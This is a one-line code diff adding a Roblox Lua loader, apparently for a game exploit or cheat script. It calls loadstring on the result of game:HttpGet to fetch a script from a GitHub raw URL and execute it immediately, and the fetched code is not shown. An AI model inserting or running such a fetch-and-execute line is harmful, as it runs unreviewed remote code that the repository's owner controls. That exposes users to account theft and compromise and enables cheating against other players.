@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/x5-exp-event-sans-aus-fighter-2-spam7-1h758f1wo8kewt.lua"))()
